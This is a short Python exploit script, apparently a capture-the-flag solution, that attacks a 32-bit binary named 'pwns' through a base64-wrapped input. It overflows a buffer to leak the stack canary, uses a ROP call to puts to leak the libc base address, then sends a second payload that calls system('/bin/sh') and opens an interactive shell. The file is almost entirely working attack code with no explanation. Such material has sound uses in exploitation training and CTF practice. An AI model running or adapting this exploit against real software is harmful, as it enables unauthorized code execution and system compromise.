#coding:utf-8
from PwnContext.core import *
import base64

context.log_level = 'debug'

def senddata(data):
	p.recvuntil('data[Y/N]\n')
	p.sendline('Y')
	p.recvuntil('datas:\n\n')
	p.sendline(base64.b64encode(data))


binary = './pwns'
debug_libc = './libc.so.6'
ctx.binary = binary
ctx.remote_libc = debug_libc
elf = ELF(binary)
libc = ELF(debug_libc)
ctx.debug_remote_libc = True
p = ctx.start()

#leak canary
senddata('a'*(0x10d-0xc+1))
p.recvuntil('a'*(0x10d-0xc+1))
canary = u32(p.recv(3).rjust(4,'\x00'))
log.success('canary : 0x%x'%canary)

#leak libc
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
binsh_offset = libc.search('/bin/sh').next()
payload = 'a'*(0x10d-0xc) + p32(canary) + p32(0) + 'a'*0x8
payload += p32(puts_plt) + p32(0x08048B8A) + p32(puts_got)
senddata(payload)
p.recvuntil('a\n')
libc_base = u32(p.recv(4)) - puts_offset
log.success('libc_base addr : 0x%x'%libc_base)
system_addr = libc_base + system_offset
log.success('system addr : 0x%x'%system_addr)
binsh_addr = libc_base + binsh_offset

#system('/bin/sh\x00')
payload = 'a'*(0x10d-0xc) + p32(canary) + p32(0) + 'a'*0x8
payload += p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)
senddata(payload)

p.interactive()